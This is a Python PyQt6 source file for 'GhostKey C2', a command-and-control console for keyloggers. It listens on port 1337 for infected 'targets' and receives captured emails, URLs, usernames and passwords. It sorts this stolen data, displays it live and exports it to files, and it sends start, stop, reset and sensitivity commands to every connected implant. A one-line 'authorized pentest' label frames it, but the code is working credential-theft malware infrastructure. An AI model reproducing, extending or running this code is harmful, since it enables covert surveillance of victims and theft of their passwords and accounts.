#!/usr/bin/env python3
"""
HackerKey Controller v2.1 - Attacker GUI
Authorized Pentest Command & Control Interface
Connects to target keyloggers via TCP sockets
"""

import sys
import json
import threading
import time
from datetime import datetime
from pathlib import Path
import socket
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QTextEdit, QLabel, QLineEdit, QGroupBox,
    QProgressBar, QMessageBox, QTabWidget, QListWidget, QComboBox
)
from PyQt6.QtCore import QTimer, Qt, pyqtSignal, QObject, QThread
from PyQt6.QtGui import QFont, QPalette, QColor
import hashlib

class KeySignal(QObject):
    key_received = pyqtSignal(str)
    status_update = pyqtSignal(str)
    target_connected = pyqtSignal(str)
    target_disconnected = pyqtSignal(str)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

class ClientHandler(QThread):
    def __init__(self, sock, addr, signal_obj):
        super().__init__()
        self.sock = sock
        self.addr = addr
        self.host = addr[0]
        self.port = addr[1]
        self.signal_obj = signal_obj
        self.running = False
        self.target_id = hashlib.md5(f"{self.host}:{self.port}".encode()).hexdigest()[:8]

    def run(self):
        try:
            self.running = True
            self.signal_obj.target_connected.emit(f"Target-{self.target_id} ({self.host})")
            while self.running:
                try:
                    data = self.sock.recv(4096).decode('utf-8')
                    if not data:
                        break
                    try:
                        key_event = json.loads(data)
                        # Add target ID if missing
                        if 'target_id' not in key_event:
                            key_event['target_id'] = self.target_id
                        self.signal_obj.key_received.emit(json.dumps(key_event))
                    except json.JSONDecodeError:
                        continue
                except socket.timeout:
                    continue
                except Exception:
                    break
        except Exception as e:
            self.signal_obj.status_update.emit(f"Connection error with {self.host}: {e}")
        finally:
            self.cleanup()

    def send_command(self, command):
        if self.sock and self.running:
            try:
                self.sock.send(command.encode('utf-8'))
                return True
            except:
                return False
        return False

    def cleanup(self):
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
        self.signal_obj.target_disconnected.emit(f"Target-{self.target_id}")

class ServerThread(QThread):
    def __init__(self, port, signal_obj):
        super().__init__()
        self.port = port
        self.signal_obj = signal_obj
        self.running = False
        self.sock = None
        self.clients = []

    def run(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # Listen on all interfaces
            self.sock.bind(('0.0.0.0', self.port))
            self.sock.listen(5)
            self.running = True
            local_ip = get_local_ip()
            self.signal_obj.status_update.emit(f"Server listening on {local_ip}:{self.port}")
            while self.running:
                try:
                    self.sock.settimeout(1.0)
                    try:
                        client_sock, addr = self.sock.accept()
                        handler = ClientHandler(client_sock, addr, self.signal_obj)
                        handler.start()
                        self.clients.append(handler)
                    except socket.timeout:
                        continue
                except Exception as e:
                    if self.running:
                        self.signal_obj.status_update.emit(f"Server error: {e}")
        except Exception as e:
            self.signal_obj.status_update.emit(f"Could not bind server: {e}")
        finally:
            if self.sock:
                self.sock.close()

    def stop(self):
        self.running = False
        for client in self.clients:
            client.cleanup()

class HackerKeyController(QMainWindow):
    def __init__(self):
        super().__init__()
        self.clients = []  # Keep track of clients
        self.keys_buffer = []  # Store categorized sensitive data
        self.signal_obj = KeySignal()
        self.signal_obj.key_received.connect(self.on_key_received)
        self.signal_obj.target_connected.connect(self.on_target_connected)
        self.signal_obj.target_disconnected.connect(self.on_target_disconnected)
        self.signal_obj.status_update.connect(self.on_status_update)
        self.output_dir = Path("hackerkey_c2_logs")
        self.output_dir.mkdir(exist_ok=True)
        self.init_ui()
        # Start Server automatically
        self.server_port = 1337
        self.server_thread = ServerThread(self.server_port, self.signal_obj)
        self.server_thread.start()

    def init_ui(self):
        self.setWindowTitle("👻 GhostKey C2 | Advanced Command & Control")
        self.setGeometry(100, 100, 1400, 900)
        self.setStyleSheet(self.get_global_styles())
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)

        # Header
        header = self.create_header()
        layout.addWidget(header)

        # Tabs
        tabs = QTabWidget()
        tabs.setStyleSheet(self.get_tab_styles())

        # Live C2 Tab
        live_tab = self.create_live_tab()
        tabs.addTab(live_tab, "🔴 LIVE C2 KEYS")

        # Categorized Tab
        categorized_tab = self.create_categorized_tab()
        tabs.addTab(categorized_tab, "📊 CATEGORIZED")

        # Targets Tab
        targets_tab = self.create_targets_tab()
        tabs.addTab(targets_tab, "🎯 TARGETS")

        # Commands Tab
        commands_tab = self.create_commands_tab()
        tabs.addTab(commands_tab, "📡 COMMANDS")

        layout.addWidget(tabs)

        # Status
        self.status_label = QLabel("🟢 C2 READY | 0 targets | 0 entries")
        self.status_label.setStyleSheet(self.get_status_style())
        layout.addWidget(self.status_label)

    def create_header(self):
        header_layout = QVBoxLayout()
        title = QLabel("👻 GhostKey C2 👻")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setStyleSheet("""
            font-size: 32px;
            font-weight: bold;
            color: #00ff41;
            margin: 15px;
            font-family: 'Courier New', monospace;
        """)
        subtitle = QLabel("Silent Keylogger Controller | Socket-based Pentest Platform")
        subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
        subtitle.setStyleSheet("""
            color: #ff4444;
            font-size: 16px;
            margin: 0;
            font-family: 'Courier New', monospace;
        """)
        header_layout.addWidget(title)
        header_layout.addWidget(subtitle)
        header_widget = QWidget()
        header_widget.setLayout(header_layout)
        header_widget.setStyleSheet("""
            margin: 10px;
            padding: 25px;
            background: qlineargradient(x1:0,y1:0,x2:1,y2:1,stop:0 #001100,stop:1 #003300);
            border: 3px solid #00ff41;
            border-radius: 15px;
        """)
        return header_widget

    def create_live_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Stats with categorized counters
        stats_group = QGroupBox("📊 C2 STATS")
        stats_layout = QHBoxLayout(stats_group)

        self.target_count = QLabel("Targets: 0")
        self.key_count = QLabel("Entries: 0")
        
        # Add categorized counters
        self.email_count = QLabel("📧 Emails: 0")
        self.url_count = QLabel("🌐 URLs: 0")
        self.username_count = QLabel("👤 Usernames: 0")
        self.password_count = QLabel("🔑 Passwords: 0")

        # Style all counters
        for label in [self.target_count, self.key_count, self.email_count, 
                      self.url_count, self.username_count, self.password_count]:
            label.setStyleSheet("color: #00ff41; font-weight: bold; font-size: 16px;")

        # Add to layout
        stats_layout.addWidget(self.target_count)
        stats_layout.addWidget(self.key_count)
        stats_layout.addWidget(self.email_count)
        stats_layout.addWidget(self.url_count)
        stats_layout.addWidget(self.username_count)
        stats_layout.addWidget(self.password_count)
        stats_layout.addStretch()

        # Live keys with categorized display
        self.live_display = QTextEdit()
        self.live_display.setReadOnly(True)
        self.live_display.setStyleSheet("""
            QTextEdit { 
                background: #000; 
                color: #00ff41; 
                font-family: 'Courier New', monospace; 
                font-size: 14px; 
                border: 2px solid #00ff41; 
                border-radius: 8px; 
                padding: 15px; 
            }
        """)

        layout.addWidget(stats_group)
        layout.addWidget(self.live_display, 1)
        return widget

    def create_categorized_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Category selector
        selector_layout = QHBoxLayout()
        self.category_selector = QComboBox()
        self.category_selector.addItems(["All", "Emails", "URLs", "Usernames", "Passwords"])
        self.category_selector.currentTextChanged.connect(self.filter_categorized_data)
        selector_layout.addWidget(QLabel("Filter by category:"))
        selector_layout.addWidget(self.category_selector)
        selector_layout.addStretch()
        
        # Categorized display
        self.categorized_display = QTextEdit()
        self.categorized_display.setReadOnly(True)
        self.categorized_display.setStyleSheet("""
            QTextEdit { 
                background: #000; 
                color: #00ff41; 
                font-family: 'Courier New', monospace; 
                font-size: 14px; 
                border: 2px solid #00ff41; 
                border-radius: 8px; 
                padding: 15px; 
            }
        """)
        
        layout.addLayout(selector_layout)
        layout.addWidget(self.categorized_display, 1)
        return widget

    def create_targets_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Server Info
        info_group = QGroupBox("📡 SERVER INFO")
        info_layout = QVBoxLayout(info_group)
        local_ip = get_local_ip()

        # IP Display
        ip_layout = QHBoxLayout()
        ip_label = QLabel("ATTACKER IP:")
        self.server_ip_display = QLineEdit(local_ip)
        self.server_ip_display.setReadOnly(True)
        self.server_ip_display.setStyleSheet("background: #003300; color: #00ff41; border: 1px solid #00ff41; font-weight: bold;")
        ip_layout.addWidget(ip_label)
        ip_layout.addWidget(self.server_ip_display)

        # Port Display
        port_layout = QHBoxLayout()
        port_label = QLabel("LISTEN PORT:")
        self.server_port_display = QLineEdit("1337")
        self.server_port_display.setReadOnly(True)
        self.server_port_display.setStyleSheet("background: #003300; color: #00ff41; border: 1px solid #00ff41; font-weight: bold;")
        port_layout.addWidget(port_label)
        port_layout.addWidget(self.server_port_display)

        listening_label = QLabel("🟢 LISTENING FOR INCOMING CONNECTIONS...")
        listening_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        listening_label.setStyleSheet("color: #00ff41; font-weight: bold; margin-top: 10px;")

        info_layout.addLayout(ip_layout)
        info_layout.addLayout(port_layout)
        info_layout.addWidget(listening_label)
        layout.addWidget(info_group)

        # Targets list
        self.targets_list = QListWidget()
        self.targets_list.setStyleSheet("""
            QListWidget { 
                background: #0a0a0a; 
                color: #00ff41; 
                border: 2px solid #ff4444; 
                font-family: 'Courier New', monospace; 
                font-size: 13px; 
            }
            QListWidget::item:selected { 
                background: #00ff41; 
                color: #000; 
            }
        """)
        layout.addWidget(QLabel("📡 CONNECTED TARGETS:"))
        layout.addWidget(self.targets_list, 1)
        return widget

    def create_commands_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)

        cmd_group = QGroupBox("📡 COMMAND CENTER")
        cmd_layout = QVBoxLayout(cmd_group)

        # Command buttons
        btn_layout = QHBoxLayout()

        # Start/Stop Button
        self.toggle_log_btn = QPushButton("⏯️ START/STOP LOGGING")
        self.toggle_log_btn.clicked.connect(self.toggle_logging)
        self.style_btn(self.toggle_log_btn, "#ffaa00")

        # Reset Button
        reset_btn = QPushButton("🔄 RESET")
        reset_btn.clicked.connect(self.reset_data)
        self.style_btn(reset_btn, "#ff0000")

        # Export Button
        export_btn = QPushButton("💾 EXPORT (.TXT)")
        export_btn.clicked.connect(self.export_logs)
        self.style_btn(export_btn, "#0088ff")
        
        # Sensitivity Button
        sensitivity_btn = QPushButton("🔧 SET SENSITIVITY")
        sensitivity_btn.clicked.connect(self.set_sensitivity)
        self.style_btn(sensitivity_btn, "#ff00ff")

        btn_layout.addWidget(self.toggle_log_btn)
        btn_layout.addWidget(reset_btn)
        btn_layout.addWidget(export_btn)
        btn_layout.addWidget(sensitivity_btn)
        cmd_layout.addLayout(btn_layout)

        # Command log
        self.cmd_log = QTextEdit()
        self.cmd_log.setReadOnly(True)
        self.cmd_log.setMaximumHeight(150)
        self.cmd_log.setStyleSheet("""
            QTextEdit { 
                background: #1a1a1a; 
                color: #ff4444; 
                font-family: 'Courier New', monospace; 
                font-size: 12px; 
                border: 2px solid #ff4444; 
            }
        """)
        cmd_layout.addWidget(self.cmd_log)
        layout.addWidget(cmd_group)
        layout.addStretch()
        return widget

    def toggle_logging(self):
        if "STOP" in self.toggle_log_btn.text():
            self.send_to_all_targets("STOP")
            self.toggle_log_btn.setText("▶️ START LOGGING")
        else:
            self.send_to_all_targets("START")
            self.toggle_log_btn.setText("⏹️ STOP LOGGING")

    def reset_data(self):
        self.keys_buffer.clear()
        self.live_display.clear()
        self.categorized_display.clear()
        self.send_to_all_targets("RESET")
        self.log_command("System Reset: Buffers cleared")
        QMessageBox.information(self, "Reset", "All logs and buffers have been cleared.")

    def set_sensitivity(self):
        from PyQt6.QtWidgets import QInputDialog
        
        current, ok = QInputDialog.getDouble(
            self, "Set Sensitivity", 
            "Enter sensitivity level (0.1-1.0):", 
            0.7, 0.1, 1.0, 2
        )
        
        if ok:
            self.send_to_all_targets(f"SENSITIVITY {current}")
            self.log_command(f"Sensitivity set to {current}")

    def export_logs(self):
        if not self.keys_buffer:
            QMessageBox.warning(self, "Empty", "No logs to export!")
            return

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"ghostkey_logs_{timestamp}.txt"
        filepath = self.output_dir / filename

        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write("👻 GhostKey C2 Categorized Logs Export\n")
                f.write("======================================\n\n")

                # Group by data type
                emails = [entry for entry in self.keys_buffer if entry.get('data_type') == 'email']
                urls = [entry for entry in self.keys_buffer if entry.get('data_type') == 'url']
                usernames = [entry for entry in self.keys_buffer if entry.get('data_type') == 'username']
                passwords = [entry for entry in self.keys_buffer if entry.get('data_type') == 'password']

                # Write each category
                if emails:
                    f.write("📧 EMAILS:\n")
                    f.write("---------\n")
                    for entry in emails:
                        f.write(f"[{entry.get('timestamp')}] [{entry.get('target_id')}]: {entry.get('value')}\n")
                    f.write("\n")

                if urls:
                    f.write("🌐 URLs:\n")
                    f.write("--------\n")
                    for entry in urls:
                        f.write(f"[{entry.get('timestamp')}] [{entry.get('target_id')}]: {entry.get('value')}\n")
                    f.write("\n")

                if usernames:
                    f.write("👤 USERNAMES:\n")
                    f.write("------------\n")
                    for entry in usernames:
                        f.write(f"[{entry.get('timestamp')}] [{entry.get('target_id')}]: {entry.get('value')}\n")
                    f.write("\n")

                if passwords:
                    f.write("🔑 PASSWORDS:\n")
                    f.write("-------------\n")
                    for entry in passwords:
                        f.write(f"[{entry.get('timestamp')}] [{entry.get('target_id')}]: {entry.get('value')}\n")
                    f.write("\n")

                # Add uncategorized entries if any
                uncategorized = [entry for entry in self.keys_buffer if entry.get('data_type') not in ['email', 'url', 'username', 'password']]
                if uncategorized:
                    f.write("❓ UNCATEGORIZED:\n")
                    f.write("----------------\n")
                    for entry in uncategorized:
                        f.write(f"[{entry.get('timestamp')}] [{entry.get('target_id')}]: {entry.get('value')}\n")

            self.log_command(f"Categorized logs exported to {filename}")
            QMessageBox.information(self, "Success", f"Logs saved to {filename}")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to save logs: {str(e)}")

    def filter_categorized_data(self, category):
        """Filter and display data based on selected category."""
        self.categorized_display.clear()
        
        if category == "All":
            for entry in self.keys_buffer:
                data_type = entry.get('data_type', 'unknown')
                value = entry.get('value', '')
                target_id = entry.get('target_id', 'UNK')
                timestamp = entry.get('timestamp', '')
                
                type_emoji = {
                    'email': '📧',
                    'url': '🌐',
                    'username': '👤',
                    'password': '🔑'
                }.get(data_type, '❓')
                
                display_str = f"[{timestamp}] [{target_id}] {type_emoji} {data_type.upper()}: {value}"
                self.categorized_display.append(display_str)
        else:
            category_map = {
                "Emails": "email",
                "URLs": "url",
                "Usernames": "username",
                "Passwords": "password"
            }
            
            data_type = category_map.get(category, "")
            for entry in self.keys_buffer:
                if entry.get('data_type') == data_type:
                    value = entry.get('value', '')
                    target_id = entry.get('target_id', 'UNK')
                    timestamp = entry.get('timestamp', '')
                    
                    type_emoji = {
                        'email': '📧',
                        'url': '🌐',
                        'username': '👤',
                        'password': '🔑'
                    }.get(data_type, '❓')
                    
                    display_str = f"[{timestamp}] [{target_id}] {type_emoji} {data_type.upper()}: {value}"
                    self.categorized_display.append(display_str)

    def log_command(self, msg):
        self.cmd_log.append(f"[{time.strftime('%H:%M:%S')}] {msg}")
        self.cmd_log.verticalScrollBar().setValue(self.cmd_log.verticalScrollBar().maximum())

    def style_btn(self, btn, color):
        btn.setStyleSheet(f"""
            QPushButton {{ 
                background: qlineargradient(x1:0,y1:0,x2:0,y2:1,stop:0 {color},stop:1 {self.darken(color)}); 
                color: #000; 
                border: 2px solid {color}; 
                border-radius: 8px; 
                font-weight: bold; 
                font-size: 13px; 
                padding: 12px; 
                min-width: 140px; 
            }}
            QPushButton:hover {{ 
                background: qlineargradient(x1:0,y1:0,x2:0,y2:1,stop:0 {self.lighten(color)},stop:1 {color}); 
                border-width: 3px; 
            }}
        """)

    def darken(self, color):
        return f"#{int(int(color[1:3],16)*0.7):02x}{int(int(color[3:5],16)*0.7):02x}{int(int(color[5:7],16)*0.7):02x}"

    def lighten(self, color):
        return f"#{min(255,int(int(color[1:3],16)*1.3)):02x}{min(255,int(int(color[3:5],16)*1.3)):02x}{min(255,int(int(color[5:7],16)*1.3)):02x}"

    def get_global_styles(self):
        return """
            QMainWindow { 
                background: qlineargradient(x1:0,y1:0,x2:1,y2:1,stop:0 #000011,stop:0.5 #001100,stop:1 #000011); 
                color: #00ff41; 
            }
            QGroupBox { 
                font-weight: bold; 
                border: 2px solid #00ff41; 
                border-radius: 10px; 
                margin-top: 12px; 
                padding-top: 12px; 
                background: #0a0a0a; 
            }
            QGroupBox::title { 
                subcontrol-origin: margin; 
                left: 12px; 
                padding: 0 8px; 
                color: #00ff41; 
            }
            QLineEdit { 
                background: #1a1a1a; 
                border: 2px solid #00ff41; 
                border-radius: 6px; 
                color: #00ff41; 
                padding: 10px; 
                font-family: 'Courier New', monospace; 
            }
        """

    def get_tab_styles(self):
        return """
            QTabWidget::pane { 
                border: 3px solid #00ff41; 
                background: #0a0a0a; 
                border-radius: 10px; 
            }
            QTabBar::tab { 
                background: #1a1a1a; 
                color: #00ff41; 
                padding: 15px 25px; 
                margin-right: 3px; 
                font-weight: bold; 
            }
            QTabBar::tab:selected { 
                background: #00ff41; 
                color: #000; 
            }
            QTabBar::tab:hover { 
                background: #00aa28; 
            }
        """

    def get_status_style(self):
        return "color: #00ff41; font-weight: bold; padding: 12px; background: #0a0a0a; border: 2px solid #00ff41; font-size: 14px;"

    def on_status_update(self, message):
        self.status_label.setText(f"ℹ️ {message}")

    def on_target_connected(self, target_name):
        self.targets_list.addItem(f"🟢 {target_name}")
        self.update_status()

    def on_target_disconnected(self, target_name):
        for i in range(self.targets_list.count()):
            if target_name in self.targets_list.item(i).text():
                self.targets_list.takeItem(i)
                break
        self.update_status()

    def send_to_all_targets(self, command):
        success = 0
        # Iterate over active clients managed by server thread
        if hasattr(self, 'server_thread'):
            for client in self.server_thread.clients:
                if client.running and client.send_command(command):
                    success += 1
        total_clients = len(self.server_thread.clients) if hasattr(self, 'server_thread') else 0
        self.cmd_log.append(f"[{time.strftime('%H:%M:%S')}] 📡 Sent '{command}' to {success}/{total_clients} targets")
        self.cmd_log.verticalScrollBar().setValue(self.cmd_log.verticalScrollBar().maximum())

    def on_key_received(self, data_json):
        """Handle incoming data from targets with categorization."""
        try:
            data = json.loads(data_json)
            
            if data.get('type') == 'sensitive_data':
                # Format based on data type
                data_type = data.get('data_type', 'unknown')
                value = data.get('value', '')
                target_id = data.get('target_id', 'UNK')
                timestamp = data.get('timestamp', '')
                
                # Create formatted display string with appropriate emoji
                type_emoji = {
                    'email': '📧',
                    'url': '🌐',
                    'username': '👤',
                    'password': '🔑'
                }.get(data_type, '❓')
                
                display_str = f"[{timestamp}] [{target_id}] {type_emoji} {data_type.upper()}: {value}"
                self.live_display.append(display_str)
                
                # Store with categorization
                self.keys_buffer.append(data)
                
                # Update categorized counters
                if data_type == 'email':
                    count = int(self.email_count.text().split(': ')[1]) + 1
                    self.email_count.setText(f"📧 Emails: {count}")
                elif data_type == 'url':
                    count = int(self.url_count.text().split(': ')[1]) + 1
                    self.url_count.setText(f"🌐 URLs: {count}")
                elif data_type == 'username':
                    count = int(self.username_count.text().split(': ')[1]) + 1
                    self.username_count.setText(f"👤 Usernames: {count}")
                elif data_type == 'password':
                    count = int(self.password_count.text().split(': ')[1]) + 1
                    self.password_count.setText(f"🔑 Passwords: {count}")
                
                self.live_display.verticalScrollBar().setValue(self.live_display.verticalScrollBar().maximum())
                self.update_status()
        except json.JSONDecodeError:
            pass  # Ignore malformed JSON

    def update_status(self):
        target_count = len([c for c in self.server_thread.clients if c.running]) if hasattr(self, 'server_thread') else 0
        self.target_count.setText(f"Targets: {target_count}")
        self.key_count.setText(f"Entries: {len(self.keys_buffer)}")

def main():
    app = QApplication(sys.argv)
    window = HackerKeyController()
    window.show()
    sys.exit(app.exec())

if __name__ == "__main__":
    main()